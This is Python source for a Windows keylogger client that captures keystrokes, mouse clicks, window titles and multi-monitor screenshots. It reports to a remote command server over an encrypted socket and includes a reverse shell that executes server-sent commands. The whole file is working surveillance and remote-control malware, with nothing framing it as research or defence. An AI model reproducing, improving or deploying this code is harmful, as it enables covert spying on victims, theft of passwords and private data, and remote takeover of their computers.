# -*- coding: utf-8 -*-
import keyboard
import logging
import mouse
import os
import platform
import pyautogui
import socket
import time
import utils
from datetime import datetime, timedelta
from functools import partial
from PIL import ImageGrab
from screeninfo import get_monitors
from threading import Thread
from win32gui import GetWindowText, GetForegroundWindow

logging.basicConfig(level=logging.DEBUG) # Later set to logging.WARNING in order to mute the client
reverse_shell_active = False

class Keylogger:
    def __init__(self, log_interval, window_interval, reconnect_interval):
        self.active = False
        self.connected = False
        self.filecounter = 0

        self.log_interval = log_interval
        self.log = ""

        self.window_interval = window_interval
        self.foreground_window = ""

        self.start_time = datetime.now()
        self.end_time = datetime.now()

        self.reconnect_interval = reconnect_interval
        self.sock = None
        self.host = "127.0.0.1"
        self.port = 1005

        self.log_directory = "tmp" #"C:\\tmp"

        ImageGrab.grab = partial(ImageGrab.grab, all_screens=True) # Take Screenshots of all Screens at once

#--------------- CALLBACK FUNCTIONS ---------------#
    def keyboard_callback(self, event):
        if self.active:
            name = event.name
            if len(name) > 1:
                if name == "space":
                    name = " "
                elif name == "enter":
                    name = "[ENTER]\n"
                elif name == "decimal":
                    name = "."
                else:
                    name = name.replace(" ", "_")
                    name = f"[{name.upper()}]"
            self.log += name

    def mouse_left_callback(self):
        if self.active:
            self.log += f"[L_CLICK, {mouse.get_position()}]"

    def mouse_right_callback(self):
        if self.active:
            self.log += f"[R_CLICK, {mouse.get_position()}]"

#--------------- WRITE FUNCTIONS ---------------#
    def write_information_file(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

        filename = f"information-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
        with open(os.path.join(self.log_directory, filename), "w+", encoding=utils.ENCODING) as file:
            uname = platform.uname()

            file.write("Monitors:\n")
            for m in get_monitors():
                file.write((
                        f"\tname: {m.name}\n"
                        f"\tx: {m.x}\n"
                        f"\ty: {m.y}\n"
                        f"\twidth (pixel): {m.width}\n"
                        f"\theight (pixel): {m.height}\n"
                        f"\twidth (mm): {m.width_mm}\n"
                        f"\theight (mm): {m.height_mm}\n"
                        f"\tis primary?: {m.is_primary}\n\n"
                    ))
            file.write((
                        f"System: {uname.system}\n"
                        f"Node Name: {uname.node}\n"
                        f"Release: {uname.release}\n"
                        f"Version: {uname.version}\n"
                        f"Machine: {uname.machine}\n"
                        f"Processor: {uname.processor}\n"
                    ))

    def write_keylogs_to_file(self, foreground_window):
        if self.log:
            if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)

            filename = f"keylog-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.txt"
            with open(os.path.join(self.log_directory, filename), "w", encoding=utils.ENCODING) as file:
                file.write((
                        f"Foreground Window: {foreground_window}\n"
                        f"Starttime: {self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Endtime: {self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}\n"
                        f"Filecounter: {self.filecounter}\n"
                        f"------------------------\n\n"
                        f"{self.log}"
                    ))
            self.start_time = datetime.now()
        self.log = ""

    def screenshot(self):
        if not os.path.exists(self.log_directory):
                os.makedirs(self.log_directory)
        
        filename = f"screenshot-{self.start_time.strftime('%Y-%m-%d-%H-%M-%S')}-{self.end_time.strftime('%Y-%m-%d-%H-%M-%S')}.png"
        pyautogui.screenshot(os.path.join(self.log_directory, filename))

#--------------- SERVER FUNCTIONS ---------------#
    def connect_to_host(self):
        self.sock = socket.socket()
        while not self.connected:
            try:
                self.sock.connect((self.host, self.port))
                self.connected = True
            except socket.error as err:
                self.connected = False
                logging.debug(err)
                time.sleep(self.reconnect_interval)

    def send_to_server(self, data: str | bytes, filename: str = None):
        chunk_size = utils.BUFFSIZE-96  # chunk_size must be lower than BUFFSIZE, because encrypting adds some bytes to the chunk.        
        if isinstance(data, str):
            data = data.encode(utils.ENCODING) # if sent data is of type string, encode it to bytes

        chunks = [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)] # split data in chunks of chunk_size to send them one by one

        # create and send header, containing filename and number of chunks that will be sent
        if filename:
            header = "__".join([filename, str(len(chunks))]).encode(utils.ENCODING)
        else:
            header = str(len(chunks)).encode(utils.ENCODING)
        self.encrypt_and_send(header)
        
        for chunk in chunks:
            self.encrypt_and_send(chunk)
            time.sleep(0.00001)

        if filename:
            self.encrypt_and_send("done sending file".encode(utils.ENCODING))

    def encrypt_and_send(self, data):
        encrypted_data = utils.encrypt(data)
        while True:
            try:
                self.sock.sendall(encrypted_data)
                break
            except socket.error as err:
                self.connected = False
                logging.debug(err)
                self.connect_to_host()

    def receive_message_from_server(self):
        try:
            recv = self.sock.recv(utils.BUFFSIZE)
            plaintext = utils.decrypt(recv).decode(utils.ENCODING)
            return plaintext
        except (socket.error, AttributeError) as err:
                self.connected = False
                logging.debug(err)
                self.connect_to_host()
        

#--------------- POLLING FUNCTIONS ---------------#
    def check_foreground_window(self):
        while True:
            if self.active:
                current_window = GetWindowText(GetForegroundWindow())
                timenow = datetime.now()

                if current_window != self.foreground_window:
                    self.write_keylogs_to_file(self.foreground_window)
                    self.screenshot()
                    self.foreground_window = current_window
                    self.filecounter = 0

                elif (timenow - self.start_time) >= timedelta(seconds=self.log_interval):
                    self.end_time = timenow
                    self.write_keylogs_to_file(current_window)
                    self.screenshot()
                    self.filecounter += 1

            time.sleep(self.window_interval)

#--------------- START / STOP ---------------#
    def activate(self):
        self.active = True
    
    def deactivate(self):
        self.active = False

    def start(self):
        self.write_information_file()

        keyboard.on_press(callback=self.keyboard_callback)
        mouse.on_click(callback=self.mouse_left_callback)
        mouse.on_right_click(callback=self.mouse_right_callback)

        t = Thread(target=self.check_foreground_window)
        t.daemon = True
        t.start()

    def stop(self):
        self.deactivate()
        self.sock.close()

#--------------- MAIN ---------------#
if __name__ == "__main__":
    keylogger = Keylogger(log_interval=15, window_interval=0.25, reconnect_interval=5)
    keylogger.start()
    keylogger.connect_to_host()

    while True:
        recv = keylogger.receive_message_from_server()
        if recv:
            if reverse_shell_active:
                if recv == "exit":
                    reverse_shell_active = False
                    keylogger.send_to_server("reverse shell deactivated")
                else:
                    data = utils.execute_command(recv)
                    keylogger.send_to_server(data)
            else:
                if recv == "activate":
                    keylogger.activate()
                    keylogger.send_to_server("logging activated")
                elif recv == "deactivate":
                    keylogger.deactivate()
                    keylogger.send_to_server("logging deactivated")
                elif recv == "send":
                    filename = "test.png"
                    keylogger.send_to_server(data=utils.convert_file_to_bytes(filename, "tmp"), filename=filename)
                elif recv == "shell":
                    reverse_shell_active = True
                    keylogger.send_to_server("reverse shell activated")
                elif recv == "stop":
                    keylogger.send_to_server("keylogger stopped")
                    keylogger.stop()
                    break
                else:
                    keylogger.send_to_server("received")
                    print(recv)
